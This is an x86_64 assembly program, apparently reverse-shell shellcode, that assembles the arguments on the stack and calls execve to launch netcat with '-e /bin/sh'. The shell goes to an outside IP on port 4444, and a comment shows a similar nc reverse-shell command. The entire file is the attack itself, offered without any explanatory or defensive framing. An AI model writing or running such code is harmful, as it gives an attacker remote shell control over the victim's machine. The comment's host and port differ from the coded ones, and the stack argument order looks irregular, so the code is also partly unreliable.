;arg x86_64        rdi   rsi   rdx   r10   r8    r9    -

section	.text
    	global _start

_start:
	jmp main


execve:
	enter 0, 0
	;push rbp
	;mov rbp, rsp
	xor rax,rax
	;xor rdi,rdi
	mov rax, 59  ; execve syscall
	mov rdi, [rbp+16]   ; name
	mov rsi, [rbp+24] ; tab
	mov rdx, 0  
	syscall  
	leave
	;mov rsp, rbp
	;pop rbp
	ret


main:

	;nc 192.168.1.15 5000 -e /bin/sh 2>&1 >&/dev/null

	xor rdx, rdx
	push rdx
	mov rsi, 'dev/null'
	push rsi
	mov rsi, '2>&1 >&/'
	push rsi
	push rsp
	pop r11

	push rdx
	mov rsi, '/bin/sh'
	push rsi
	push rsp
	pop r12

	push rdx
	mov rsi, '-e'
	push rsi
	push rsp
	pop r13

	push rdx
	mov rsi, '4444'
	push rsi
	push rsp
	pop r14

	;109.213.216.100
	push rdx
	mov rsi, '.216.100'
	push rsi
	mov rsi, '109.213.'
	push rsi
	push rsp
	pop r15

	push rdx
	mov rsi, '/bin/nc'
	push rsi
	push rsp
	pop rdi

	push rdx ; push null
	push r11
	push r12
	push r13
	push r14
	push r15
	push rdi
	push rsp

	push rdi
	call execve
